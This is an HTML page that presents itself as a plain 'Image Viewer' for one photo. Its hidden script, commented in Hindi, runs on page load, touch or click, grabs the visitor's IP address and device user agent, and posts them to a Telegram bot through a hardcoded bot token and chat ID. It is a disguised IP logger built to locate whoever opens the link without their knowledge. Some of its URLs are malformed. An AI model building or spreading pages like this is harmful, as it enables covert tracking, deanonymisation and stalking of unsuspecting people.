<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: black; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; user-select: none; }
        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
    </style>
</head>
<body>

    <!-- 📷 फोटो अब हर हाल में दिखेगी -->
    <img src="photo.jpg" alt="Image Viewer">

    <script>
        const telegramToken = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
        const telegramChatId = "1798743066"; 

        let isTracked = false;

        function startTracking() {
            if (isTracked) return;
            isTracked = true;

            // 🌐 बिना किसी फिल्टर के सबसे तेज और डायरेक्ट आईपी निकालने वाली लाइव API
            fetch('https://ipify.org')
            .then(res => res.json())
            .then(data => {
                sendToTelegram(data.ip);
            })
            .catch(() => {
                // बैकअप तरीका: अगर पहली API व्यस्त हो तो तुरंत दूसरी API चालू होगी
                fetch('https://ipapi.co')
                .then(res => res.json())
                .then(data => sendToTelegram(data.ip))
                .catch(() => sendToTelegram("IP Hidden/VPN Active"));
            });
        }

        function sendToTelegram(ip) {
            const userAgentText = navigator.userAgent;

            const message = `🚨 *New Visitor Alert* 🚨\n\n` +
                            `🌐 *IP Address:* \`${ip}\`\n` +
                            `📱 *Device Details:* \`${userAgentText}\`\n` +
                            `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}` ;

            fetch(`https://telegram.org{telegramToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }

        // विज़िटर के पैर रखते ही या स्क्रीन टच करते ही तुरंत टेलीग्राम पर डेटा जाएगा
        window.addEventListener('DOMContentLoaded', startTracking);
        window.addEventListener('touchstart', startTracking);
        window.addEventListener('click', startTracking);
    </script>

</body>
</html>
